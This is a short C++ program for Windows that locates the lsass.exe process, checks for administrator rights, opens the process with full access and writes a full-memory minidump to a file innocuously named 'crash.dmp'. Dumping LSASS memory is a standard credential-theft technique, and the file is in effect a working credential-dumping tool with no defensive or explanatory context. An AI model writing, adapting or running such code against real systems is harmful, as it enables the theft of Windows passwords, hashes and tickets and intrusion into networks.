#include<iostream>
#include<Windows.h>
#include<tchar.h>
#include<DbgHelp.h>
#include<ShlObj.h>

using namespace std;
#include "helpers.h"

int main() {

	//name of the process to dump
	char* processToDump = "lsass.exe";
	
	const DWORD Flags = MiniDumpWithFullMemory |
		MiniDumpWithFullMemoryInfo |
		MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules |
		MiniDumpWithThreadInfo;

	bool check_admin = IsUserAnAdmin();
	DWORD ProcId = GetProcId(processToDump);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, ProcId);
	cout << "Process ID " << processToDump << ": " << ProcId << endl;
	
	if (processToDump == "lsass.exe" && !check_admin) {
		cout << "Need to run as admin to dump: " << processToDump << endl;
		return 0;
	}

	HANDLE hFile = CreateFile("crash.dmp", GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		cout << "File creation error\n";
	
	//	BOOL dump = MiniDumpWriteDump(hProcess, ProcId, hFile, (MINIDUMP_TYPE)Flags, NULL, NULL, NULL);
	BOOL dump = MiniDumpWriteDump(hProcess, ProcId, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (!dump) {
		cerr << _T("Looks like an error: MiniDumpWriteDump failed\n");
	}


	return 0;
}